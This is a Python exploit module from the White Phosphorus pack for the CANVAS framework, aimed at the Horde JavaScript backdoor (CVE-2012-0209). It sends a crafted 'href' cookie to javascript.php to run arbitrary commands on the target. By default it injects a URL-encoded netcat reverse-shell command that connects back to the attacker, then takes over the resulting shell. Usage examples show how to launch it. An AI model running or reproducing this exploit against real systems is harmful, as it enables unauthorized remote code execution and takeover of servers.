
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
import libs.spkproxy as spkproxy

from shelllistener import shelllistener
from shelllistener import *
from unixShellNode import unixShellNode
from libs.ctelnetlib import Telnet

######################################################################################
NAME = "Horde Javascript Backdoor Remote Code Execution"
DESCRIPTION = "Exploits a remote backdoor in Horde"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Horde'
DOCUMENTATION["Date public"] = "2012-02-13"
DOCUMENTATION["Repeatability"] = "Unlimited"
DOCUMENTATION['CVE Name']="CVE-2012-0209"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0209'
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["References"] = "http://eromang.zataz.com/2012/02/15/cve-2012-0209-horde-backdoor-analysis/"
DOCUMENTATION["Notes"] = """ 
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux"] ]
PROPERTY['VERSION'] = [ "All" ]


NOTES="""
----------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> Horde Javascript Backdoor Remote Code Execution
---------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>
-U <horde app>        -P <horde path>


Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Linux

Payloads:
0: TCP Connect Back
1: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_horde_javascript_backdoor/wp_horde_javascript_backdoor.py  -v0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
./3rdparty/White_Phosphorus/exploits/wp_horde_javascript_backdoor/wp_horde_javascript_backdoor.py  -v0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:1 -O command:uname -a
"""

PORT = 80
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return 

targets = {
    0 : ["Linux", (0x00000000), [LINALL]]
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ##########################s###########################################################
    PAYLOADS=["TCP Connect Back",
              "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x0a\x0d"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        self.ssl = 1
        self.hordeapp = 'horde'
        self.hordepath = '/horde3'
        self.rcv_port = 11012
        return

    def usage(self):
        self.wp_usage(targets,"-U <horde app>\t -P <horde path>")
        return 
    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        useragentstring = "http://"+self.host+":%s"%self.port+"/"
        UA = spkproxy.UserAgent(useragentstring, auth=None, hostname=self.host, exploit=self)
        data = UA.POST("%s/services/javascript.php"%self.hordepath, "app=%s&file=open_calendar.js"%(self.hordeapp), extraheaders=None, noresponse=False)
        
        ret = 0
        if ((data.find("Horde Calendar javascript widget")) > 0):
            ret = 1
        return ret

    def neededListenerTypes(self):
        self.getArgs()
        return [canvasengine.UNIVERSAL_MOSDEF]   

    def getArgs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
                
        if self.argsDict.get('payloadType','') == 'Execute Command':
            self.shell_EXECCMD = True
            self.execCMD = self.argsDict.get('payloadExecCmd')
            self.command = self.execCMD
        elif self.argsDict.get("command",self.command):
            self.command = self.argsDict.get("command",self.command)
            
        self.hordeapp=self.argsDict.get('hordeapp',self.hordeapp)
        self.hordepath=self.argsDict.get('hordpath',self.hordepath) 
            
        self.shell_TCPCONNECTBACK = True # to cause the ip:port to be populated
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return
    
    def run(self):
        self.getArgs()

        useragentstring = "http://"+self.host+":%s"%self.port+"/"
        UA = spkproxy.UserAgent(useragentstring, auth=None, hostname=self.host, exploit=self)
        
        ret = 0
        if self.command:
            self.log("WP> Executing Command: %s"%self.command)
            self.log("WP> Sending Exploit")
            UA.SetCookie("href", "system:"+self.command)
            data = UA.POST("%s/services/javascript.php"%self.hordepath,"app=%s&file=open_calendar.js"%(self.hordeapp), extraheaders=None, noresponse=False)
            lhref = 'link.href = \'#'
            for i in range(len(data)):
                if lhref in data[i:i+len(lhref)]:
                    if not '\';' in data[i+len(lhref):i+len(lhref)+2]:
                        result = data[i+len(lhref):data.find('\n\';',(i+len(lhref)))]
                        ret = 1
                        self.log("WP> Command Result:\n%s\r\n "%prettyprint(result))
            time.sleep(2)
            
            if ret:
                self.setInfo("WP> %s attacking %s:%d - completed (success!)"%(NAME,self.host,self.port))
            else:
                self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return ret
        else:                        
            lsock = self.gettcplistener(self.rcv_port,self.callback.ip)
            if lsock == 0: 
                self.log("WP> Unable to list on port %d"%self.rcv_port)
                self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
                return 0
            self.log("WP> Listening on port %d"%self.rcv_port)
            
            self.log("WP> Sending Exploit")
            #  nc -n ip port -e /bin/sh \&\n
            UA.SetCookie("href", "system:nc -n " + self.callback.ip + " " + str(self.rcv_port) + "%20%2d%65%20%2f%62%69%6e%2f%73%68%20%5c%26%5c%6e")
            data = UA.POST("%s/services/javascript.php"%self.hordepath,"app=%s&file=open_calendar.js"%(self.hordeapp), extraheaders=None, noresponse=True)
            
            self.log("WP> Awaiting connectback")
            lsock.set_timeout(30)
            try:
                (s2, addr) = lsock.accept()
                s2.set_timeout(2)
            except:
                self.log("WP> Connectback failed")
                self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
                return 0
            
            telnetshell=Telnet()
            telnetshell.sock=s2
            try:
                shell = shelllistener(shellfromtelnet(telnetshell), logfunction=self.logfunction, simpleShell=1)
            except:
                self.log("WP> Shell listener failed - connection closed")
                self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
                return 0
            
            node = unixShellNode()
            node.parentnode = self.argsDict["passednodes"][0]        
            node.shell = shell

            self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
            return node

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
